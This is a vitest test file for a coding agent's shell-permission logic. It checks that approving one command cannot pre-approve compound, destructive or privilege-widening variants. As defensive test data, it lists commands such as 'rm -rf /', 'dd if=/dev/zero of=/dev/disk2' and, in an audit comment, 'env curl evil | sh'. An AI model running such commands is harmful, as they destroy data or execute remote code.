// 夜移 006 (opencode permission/arity port, hardened): the rule an `a`/`p`
// answer records for shell. wudao's askRuleFor previously fell through
// to the BARE tool rule — approving ONE command blanket-approved EVERY
// command. The port derives a command-prefix rule (opencode's BashArity)
// with three tightenings opencode lacks:
//   1. compound commands (unquoted ; | & < > ` $( ) records NO rule — a
//      pipeline's second half is never pre-approved by its first;
//   2. destructive heads (rm, dd, kill…) degrade to EXACT-match, not prefix;
//   3. unknown heads record the EXACT command (opencode's arity-1 default
//      would turn `python a.py` into `python *` — arbitrary-script blanket).
import { describe, it, expect } from "vitest";
import { commandArityRule, commandHeadTokens } from "../src/permission-arity.js";

describe("commandHeadTokens — quote-aware head tokenizer", () => {
  it("splits on whitespace and skips leading VAR=value assignments", () => {
    expect(commandHeadTokens("FOO=1 git status --porcelain")).toEqual(["git", "status", "--porcelain"]);
    expect(commandHeadTokens("A=1 B=2 cargo build")).toEqual(["cargo", "build"]);
  });
  it("keeps tokens verbatim (no flag stripping — the arity table counts subcommands only)", () => {
    expect(commandHeadTokens("git checkout -b feature/x")).toEqual(["git", "checkout", "-b", "feature/x"]);
  });
  it("unquoted shell operators make the whole command compound → null (no rule)", () => {
    expect(commandHeadTokens("git checkout main && rm -rf /")).toBeNull();
    expect(commandHeadTokens("cat a | grep x")).toBeNull();
    expect(commandHeadTokens("echo a; echo b")).toBeNull();
    expect(commandHeadTokens("ls > out.txt")).toBeNull();
    expect(commandHeadTokens("echo $(whoami)")).toBeNull();
    expect(commandHeadTokens("echo `whoami`")).toBeNull();
    expect(commandHeadTokens("line1\nline2")).toBeNull();
  });
  it("the same operators INSIDE quotes are plain text, not compounds", () => {
    expect(commandHeadTokens('git commit -m "fix: a && b"')).toEqual(["git", "commit", "-m", '"fix:', "a", "&&", 'b"']);
    expect(commandHeadTokens("echo 'a; b'")).toEqual(["echo", "'a;", "b'"]); // split is whitespace-naive; compounds are what quotes guard, not token shape
  });
  it("empty/whitespace-only input → null", () => {
    expect(commandHeadTokens("")).toBeNull();
    expect(commandHeadTokens("   ")).toBeNull();
  });
});

describe("commandArityRule — the rule recorded for an approval", () => {
  it("arity table: nested families take their longest known prefix", () => {
    expect(commandArityRule("git checkout main")).toBe("git checkout");
    expect(commandArityRule("npm run dev")).toBe("npm run dev"); // arity 3, only 3 tokens — the whole identity
    expect(commandArityRule("npm install")).toBe("npm install");
    expect(commandArityRule("docker compose up -d")).toBe("docker compose up");
    expect(commandArityRule("aws s3 ls bucket")).toBe("aws s3 ls");
    expect(commandArityRule("cargo run --release")).toBe("cargo run --release"); // arity 3 counts tokens, flags included (opencode parity)
  });
  it("read-only arity-1 heads record the bare head (bounded, harmless)", () => {
    expect(commandArityRule("ls -la /tmp")).toBe("ls");
    expect(commandArityRule("cat package.json")).toBe("cat");
    expect(commandArityRule("git")).toBe("git"); // head alone = arity floor
  });
  it("destructive heads degrade to EXACT match (never a prefix rule)", () => {
    expect(commandArityRule("rm -rf /tmp/x")).toBe("rm -rf /tmp/x");
    expect(commandArityRule("kill 1234")).toBe("kill 1234");
    expect(commandArityRule("dd if=/dev/zero of=/dev/disk2")).toBe("dd if=/dev/zero of=/dev/disk2");
  });
  it("unknown heads record the EXACT command (no python-* blanket)", () => {
    expect(commandArityRule("python scripts/build.py --fast")).toBe("python scripts/build.py --fast");
    expect(commandArityRule("make test")).toBe("make test");
  });
  it("exact rules are whitespace-collapsed", () => {
    expect(commandArityRule("make   test")).toBe("make test");
  });
  it("compounds record NOTHING (null) — approval covers this run only", () => {
    expect(commandArityRule("git push && npm publish")).toBeNull();
    expect(commandArityRule("rm -rf x; rm -rf y")).toBeNull();
  });
  it("leading env assignments never widen or break the rule head", () => {
    expect(commandArityRule("CI=1 pnpm build")).toBe("pnpm build");
    expect(commandArityRule("FORCE=1 rm -rf dist")).toBe("FORCE=1 rm -rf dist"); // exact form keeps the env prefix visible
  });
});

// ---------------------------------------------------------------------------
// 安全审计 2026-11 C6（HIGH）— 会话 allowlist 粒度收窄。
//
// 漏洞 1（env 启动器）：`env` 此前在 READONLY_HEADS——族级规则 shell:env
// 是 1-token 前缀，放行 `env rm -rf /`、`env curl evil | sh` 等任意
// env CMD（busybox 风格启动器）；连裸 `env` 的 exact 规则也是 1-token
// 前缀，同样放行。
// 漏洞 2（族内扩权 flag）：批准 `git push origin main` 记族规则
// shell:git push → `git push --force`、`git push --delete` 免问；批准
// `git branch feat` → `git branch -D main` 免问。带扩权 flag 的命令必须
// 退化为整条精确。
// ---------------------------------------------------------------------------
describe("env 启动器与扩权 flag 收窄（安全审计 C6）", () => {
  it("env 移出只读头：裸 env / env+赋值 / env+flags 不记任何规则（1-token 前缀即放行器）", () => {
    expect(commandArityRule("env")).toBeNull();
    expect(commandArityRule("env FOO=1")).toBeNull();
    expect(commandArityRule("env -i")).toBeNull();
  });

  it("env CMD（真命令跟随时）记整条精确——绝不放行其它 env 命令", () => {
    expect(commandArityRule("env FOO=1 npm test")).toBe("env FOO=1 npm test");
    expect(commandArityRule("env rm -rf /")).toBe("env rm -rf /");
  });

  it("扩权 flag 命中：族级/只读规则退化为整条精确", () => {
    expect(commandArityRule("git push --force origin main")).toBe("git push --force origin main");
    expect(commandArityRule("git push --force-with-lease origin main")).toBe("git push --force-with-lease origin main");
    expect(commandArityRule("git push --delete origin leak")).toBe("git push --delete origin leak");
    expect(commandArityRule("git reset --hard HEAD~3")).toBe("git reset --hard HEAD~3");
    expect(commandArityRule("git branch -D main")).toBe("git branch -D main");
    expect(commandArityRule("docker run --privileged alpine")).toBe("docker run --privileged alpine");
  });

  it("温和形态照旧记族规则——正常工作流零影响", () => {
    expect(commandArityRule("git push origin main")).toBe("git push");
    expect(commandArityRule("git checkout -b feat/x")).toBe("git checkout");
    expect(commandArityRule("npm install")).toBe("npm install");
    expect(commandArityRule("docker compose up -d")).toBe("docker compose up"); // -d（detach）不在扩权表
    expect(commandArityRule("ls -la /tmp")).toBe("ls");
    expect(commandArityRule("cargo run --release")).toBe("cargo run --release"); // 3-token arity，非族级
  });
});
